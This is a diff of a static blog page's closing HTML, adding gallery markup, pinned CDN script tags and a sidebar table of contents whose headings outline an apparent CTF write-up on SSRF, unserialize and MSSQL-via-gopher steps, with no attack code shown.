-<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
-<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
-</body>
-</html>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#post>POST</a><ol><li><a href=#description>Description</a></li><li><a href=#attacking-steps>Attacking Steps</a></li><li><a href=#hacking>Hacking</a><ol><li><a href=#nginx-misconfiguration>Nginx Misconfiguration</a></li><li><a href=#arbitrary-unserialize-i>Arbitrary Unserialize I</a></li><li><a href=#bypass-mssql>ByPass Mssql</a></li><li><a href=#soapclient>Soapclient</a></li><li><a href=#soapclient-ssrf>SoapClient SSRF</a></li><li><a href=#miniproxy-url-scheme-bypass>miniProxy URL scheme bypass</a></li><li><a href=#connect-to-mssql-via-gopher>Connect to MSSQL via gopher</a></li><li><a href=#get-flag>Get Flag</a></li></ol></li><li><a href=#conclusion>Conclusion</a></li></ol></li><li><a href=#php--bonus>php — Bonus</a><ol><li><a href=#description-1>Description</a></li><li><a href=#hacking-1>Hacking</a></li></ol></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
+<script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")})</script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
